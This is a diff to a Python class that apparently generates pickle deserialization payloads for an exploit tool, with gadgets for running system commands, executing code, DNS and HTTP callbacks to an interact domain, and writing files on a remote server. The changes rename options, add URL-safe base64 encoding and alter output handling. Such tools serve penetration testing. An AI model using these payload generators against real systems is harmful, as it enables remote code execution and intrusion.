@@ -59,33 +59,33 @@ class Pickle(Serializer):
     def __init__(self, args):
         super().__init__('', args)
         self.gadgets.append({
-            'id': 'picklesystemcommand',
+            'id': 'PickleSystemCommand',
             'name': 'PickleSystemCommand',
-            'description': 'PickleSystemCommand <system_command>',
+            'description': 'PickleSystemCommand: <system_command>',
             'format': '<system_command>'
         })
         self.gadgets.append({
-            'id': 'picklecode',
+            'id': 'PickleCode',
             'name': 'PickleCode',
-            'description': 'PickleCode <code>',
+            'description': 'PickleCode: <code>',
             'format': '<code>'
         })
         self.gadgets.append({
-            'id': 'pickledns',
+            'id': 'PickleDNS',
             'name': 'PickleDNS',
-            'description': 'PickleDNS <domain>',
+            'description': 'PickleDNS: <domain>',
             'format': '<domain>'
         })
         self.gadgets.append({
-            'id': 'picklehttpget',
+            'id': 'PickleHttpGet',
             'name': 'PickleHttpGet',
-            'description': 'PickleHttpGet <url>',
+            'description': 'PickleHttpGet: <url>',
             'format': '<url>'
         })
         self.gadgets.append({
-            'id': 'picklefilewrite',
+            'id': 'PickleFileWrite',
             'name': 'PickleFileWrite',
-            'description': 'PickleFileWrite <remote_file>;<content>',
+            'description': 'PickleFileWrite: <remote_file>;<content>',
             'format': '<remote_file>;<content>'
         })
 
@@ -114,7 +114,7 @@ class Pickle(Serializer):
         return pickle.dumps(object, protocol=pickle.HIGHEST_PROTOCOL)
     
 
-    def generate(self, chains, output):
+    def generate(self, chains):
 
         if len(chains) == 0:
             return 0
@@ -122,13 +122,13 @@ class Pickle(Serializer):
         system_command = self.chainOpts.system_command
         interact_domain = self.chainOpts.interact_domain
         py_code = self.getFileContentOrCode(self.chainOpts.python_code)
-        remote_file = self.chainOpts.remote_file
+        remote_file_to_write = self.chainOpts.remote_file_to_write
         remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else py_code
     
+        logging.info(f"Interact domain: {interact_domain}")
         logging.info(f"System command: {system_command}")
         logging.info(f"Python Code: {self.chainOpts.python_code}")
-        logging.info(f"Interact domain: {interact_domain}")
-        logging.info(f"File written on remote server: {remote_file}")
+        logging.info(f"File written on remote server: {remote_file_to_write}")
         logging.info(f"Content written on server: {remote_content}")
 
         logging.info(f"Generating payloads...")
@@ -165,7 +165,7 @@ class Pickle(Serializer):
             chainArguments = chainArguments.replace('<code>', chain_py_code)
             chainArguments = chainArguments.replace('<domain>', str(interact_domain))
             chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/?{chain['id']}")
-            chainArguments = chainArguments.replace('<remote_file>', remote_file.replace('%%ext%%', 'py'))
+            chainArguments = chainArguments.replace('<remote_file>', remote_file_to_write.replace('%%ext%%', 'py'))
             chainArguments = chainArguments.replace('<content>', chain_remote_content)
             
 
@@ -179,11 +179,13 @@ class Pickle(Serializer):
 
             if self.chainOpts.base64:
                 payload = base64.b64encode(payload)
+            elif self.chainOpts.base64_urlsafe:
+                    payload = base64.urlsafe_b64encode(payload)
             
             if self.chainOpts.url:
                 payload = urllib.parse.quote_plus(payload).encode('ascii')
             
-            output.write(payload+b"\n")
+            self.output(chain['id'], payload+b"\n")
             count = count + 1
                 
         return count
